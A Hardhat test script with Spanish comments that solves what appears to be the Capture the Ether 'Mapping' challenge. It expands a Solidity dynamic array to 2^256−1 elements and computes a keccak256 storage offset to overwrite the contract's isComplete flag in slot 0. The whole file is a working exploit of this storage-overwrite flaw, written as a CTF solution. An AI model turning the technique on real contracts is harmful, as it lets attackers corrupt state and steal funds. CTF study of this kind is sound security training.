import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, BigNumber } from "ethers";

let mappingContract: Contract;
const challengeAddress: string = "0x7f01858478C522b73f389cEf5C88C74f4F7bA73f"

beforeEach(async()=> {
  const mappingFactory = await ethers.getContractFactory("MappingChallenge");
  mappingContract = mappingFactory.attach(challengeAddress);
})

describe("Mapping", async()=>{
  it("Resuelve el Math challenge - Mapping", async()=>{
    //Primero buscamos aumentar el tamaño del array a (2^256 - 1). Sabiendo que la función "set" establece el length en "key + 1", ingresamos un key de (2^256 - 2).
    const inputKey = BigNumber.from(2).pow(256).sub(2);
    const txExpandArray = await mappingContract.set(inputKey,0);
    await txExpandArray.wait();

    //Averiguamos el offset donde comienza el array "map". El slot 1 lo pasamos a la función keccak256 en formato de 256 bits.
    const mapStartingAt = BigNumber.from(ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));

    //Averiguamos el offset que necesitamos para llegar a la dirección del slot 0, a partir de donde inicia el array "map".
    const isCompleteOffset = BigNumber.from(2).pow(256).sub(mapStartingAt);

    //Cambiamos el valor de isComplete accediendo a su dirección mediante un offset a partir de la posición inicial de "map".
    const txChangeIsComplete = await mappingContract.set(isCompleteOffset,1);
    await txChangeIsComplete.wait();

    const isComplete = await mappingContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;





    
  })
})